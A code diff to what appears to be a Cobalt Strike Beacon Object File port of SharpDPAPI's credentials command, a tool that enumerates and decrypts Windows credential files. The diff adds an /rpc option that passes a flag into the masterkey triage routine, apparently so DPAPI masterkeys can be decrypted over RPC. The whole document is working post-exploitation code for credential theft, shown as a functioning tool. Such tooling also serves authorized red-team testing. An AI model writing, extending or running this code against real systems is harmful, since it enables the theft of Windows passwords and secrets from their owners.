@@ -4,6 +4,7 @@
  * Usage:
  *   credentials [/pvk:BASE64] [/password:PASSWORD] [/ntlm:HASH]
  *               [/credkey:KEY] [/target:PATH] [/server:SERVER]
+ *               [/rpc]
  *
  * Enumerates and decrypts Windows credential files.
  */
@@ -23,6 +24,7 @@ void go(char* args, int args_len) {
     char* credkey    = BeaconDataExtract(&parser, NULL);
     char* target_str = BeaconDataExtract(&parser, NULL);
     char* server_str = BeaconDataExtract(&parser, NULL);
+    int   use_rpc    = BeaconDataInt(&parser);
 
     BYTE* pvk = NULL;
     int pvk_len = 0;
@@ -64,11 +66,11 @@ void go(char* args, int args_len) {
     BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI Credentials (BOF) ===\n");
 
     /* Step 1: Triage masterkeys first */
-    if (pvk || password || ntlm) {
+    if (pvk || password || ntlm || use_rpc) {
         triage_user_masterkeys(&cache, pvk, pvk_len,
             (password && strlen(password) > 0) ? password : NULL,
             (ntlm && strlen(ntlm) > 0) ? ntlm : NULL,
-            NULL, FALSE, target, server, FALSE, NULL);
+            NULL, (BOOL)use_rpc, target, server, FALSE, NULL);
     }
 
     /* Step 2: If we have a specific target file/folder, triage it */
